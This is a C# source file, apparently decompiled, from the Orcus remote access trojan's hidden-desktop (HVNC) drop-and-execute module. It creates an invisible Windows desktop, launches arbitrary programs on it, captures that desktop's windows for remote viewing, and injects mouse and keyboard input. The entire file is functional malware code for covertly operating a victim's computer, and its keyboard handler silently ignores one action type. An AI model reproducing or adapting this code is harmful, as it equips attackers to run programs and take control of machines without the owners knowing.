using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using Orcus.Commands.HVNC;
using Orcus.Native;
using Orcus.Shared.Commands.DropAndExecute;
using Orcus.Shared.Commands.HVNC;
using Orcus.Shared.Commands.RemoteDesktop;
using Orcus.Shared.Data;
using Orcus.Utilities.WindowsDesktop;

namespace Orcus.Commands.DropAndExecute;

public class HiddenDesktopApplicationManager : IDisposable, IApplicationWarder
{
	private readonly List<RenderWindow> _renderWindows;

	public Desktop Desktop { get; }

	public Process Process { get; set; }

	public HiddenDesktopApplicationManager()
	{
		Desktop = new Desktop();
		Desktop.Create(Guid.NewGuid().ToString("N"));
		_renderWindows = new List<RenderWindow>();
	}

	public void Dispose()
	{
		foreach (RenderWindow renderWindow in _renderWindows)
		{
			renderWindow.Dispose();
		}
	}

	public void StopExecution()
	{
		Desktop.SetCurrent(Desktop);
		foreach (RenderWindow renderWindow in _renderWindows)
		{
			NativeMethods.PostMessage(new HandleRef(null, renderWindow.Handle), WM.CLOSE, IntPtr.Zero, IntPtr.Zero);
		}
		if (Process != null)
		{
			try
			{
				Process.Kill();
			}
			catch (Exception)
			{
			}
			Process.Dispose();
			Process = null;
		}
		Desktop?.Dispose();
	}

	public void OpenApplication(string path, string arguments, bool runAsAdministrator)
	{
		Desktop.SetCurrent(Desktop);
		Process = Desktop.CreateProcess(path, arguments);
		if (Process == null)
		{
			throw new InvalidOperationException("Process is null");
		}
	}

	public WindowUpdate GetWindowUpdate(long windowHandle, out IDataInfo windowRenderData)
	{
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Expected O, but got Unknown
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_0110: Unknown result type (might be due to invalid IL or missing references)
		//IL_011d: Unknown result type (might be due to invalid IL or missing references)
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0137: Unknown result type (might be due to invalid IL or missing references)
		//IL_0145: Expected O, but got Unknown
		Desktop.SetCurrent(Desktop);
		List<Window> list;
		try
		{
			list = (from x in Desktop.GetWindows()
				where NativeMethods.IsWindowVisible(x.Handle)
				select x).ToList();
		}
		catch (Exception)
		{
			windowRenderData = null;
			return null;
		}
		WindowUpdate val = new WindowUpdate();
		val.set_AllWindows(list.Select((Window x) => x.Handle.ToInt64()).ToList());
		WindowUpdate val2 = val;
		IntPtr intPtr = Marshal.AllocHGlobal(100);
		try
		{
			foreach (Window window in list)
			{
				NativeMethods.GetWindowRect(window.Handle, out var lpRect);
				NativeMethods.GetWindowText(window.Handle, intPtr, 100);
				WindowInformation val3 = new WindowInformation();
				val3.set_Handle((long)(int)window.Handle);
				val3.set_Height(lpRect.Height);
				val3.set_Width(lpRect.Width);
				val3.set_X(lpRect.X);
				val3.set_Y(lpRect.Y);
				val3.set_Title(Marshal.PtrToStringAnsi(intPtr));
				WindowInformation val4 = val3;
				RenderWindow renderWindow = _renderWindows.FirstOrDefault((RenderWindow x) => x.WindowInformation.get_Handle() == window.Handle.ToInt64());
				if (renderWindow == null)
				{
					val2.get_NewWindows().Add(val4);
					_renderWindows.Add(new RenderWindow(val4, window.Handle));
				}
				else if (!((object)renderWindow.WindowInformation).Equals((object?)val4))
				{
					val2.get_UpdatedWindows().Add(val4);
					renderWindow.ApplyWindowInformation(val4);
				}
			}
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
		RenderWindow renderWindow2 = _renderWindows.FirstOrDefault((RenderWindow x) => x.Handle.ToInt64() == windowHandle) ?? _renderWindows.FirstOrDefault();
		if (renderWindow2 != null)
		{
			windowRenderData = renderWindow2.Render();
			val2.set_RenderedWindowHandle(renderWindow2.Handle.ToInt64());
		}
		else
		{
			windowRenderData = null;
		}
		return val2;
	}

	public void DoMouseAction(RemoteDesktopMouseAction mouseAction, int x, int y, int extra, long windowHandle)
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		Desktop.SetCurrent(Desktop);
		Desktop.DesktopActions.DoMouseAction(mouseAction, x, y, extra, windowHandle);
	}

	public void DoKeyboardAction(RemoteDesktopKeyboardAction keyboardAction, short scanCode, long windowHandle)
	{
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Invalid comparison between Unknown and I4
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		Desktop.SetCurrent(Desktop);
		GUITHREADINFO lpgui = default(GUITHREADINFO);
		lpgui.cbSize = Marshal.SizeOf((object)lpgui);
		IntPtr hWnd = new IntPtr(windowHandle);
		if (!NativeMethods.GetGUIThreadInfo(NativeMethods.GetWindowThreadProcessId(hWnd, IntPtr.Zero), ref lpgui))
		{
			throw new Win32Exception(Marshal.GetLastWin32Error());
		}
		hWnd = lpgui.hwndFocus;
		int value = NativeMethods.MapVirtualKey((uint)scanCode, MapVirtualKeyMapTypes.MAPVK_VSC_TO_VK);
		int value2 = scanCode >> 16;
		if ((int)keyboardAction != 0)
		{
			if ((int)keyboardAction != 1)
			{
				throw new ArgumentOutOfRangeException("keyboardAction", keyboardAction, null);
			}
		}
		else
		{
			NativeMethods.PostMessage(new HandleRef(null, hWnd), WM.KEYFIRST, new IntPtr(value), new IntPtr(value2));
		}
	}
}
